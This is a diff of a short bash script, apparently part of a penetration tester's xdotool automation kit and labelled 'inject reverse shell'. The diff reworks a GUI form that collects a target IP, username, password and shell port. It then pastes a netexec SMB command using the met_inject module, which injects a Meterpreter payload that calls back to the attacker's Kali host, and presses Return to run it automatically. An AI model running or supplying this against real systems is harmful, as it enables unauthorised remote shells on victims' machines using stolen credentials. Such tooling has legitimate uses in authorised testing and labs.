@@ -4,17 +4,20 @@
 inject reverse shell
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+IP_FIELD=$(form_item  "IP address" "ip")
+USERNAME_FIELD=$(form_item  "username" "username")
+PASSWORD_FIELD=$(form_item  "password" "password")
+SHELL_PORT_FIELD=$(form_item  "shell port" "shell_port")
 
-# Generate gui form
-generate_form '{"label": "IP address", "type": "text", "name": "IP"}''{"label": "Username", "type": "text", "name": "Username"}'"Password" "Port"
+# Generate GUI form
+generate_form "${IP_FIELD}" "${USERNAME_FIELD}" "${PASSWORD_FIELD}" "${SHELL_PORT_FIELD}"
 
-IP=${form_data["IP"]}
-USERNAME=${form_data["Username"]}
-PASSWORD=${form_data["Password"]}
-PORT=${form_data["Port"]}
+IP=${form_data["ip"]}
+USERNAME=${form_data["username"]}
+PASSWORD=${form_data["password"]}
+SHELL_PORT=${form_data["shell_port"]}
 
-paste_command "netexec smb ${IP} -u '${USERNAME}' -p '${PASSWORD}' --local-auth -M met_inject -o SRVHOST=${KALI_IP} SRVPORT=${PORT}"
+paste_command "netexec smb ${IP} -u '${USERNAME}' -p '${PASSWORD}' --local-auth -M met_inject -o SRVHOST=${KALI_IP} SRVPORT=${SHELL_PORT}"
+xdotool key Return
  
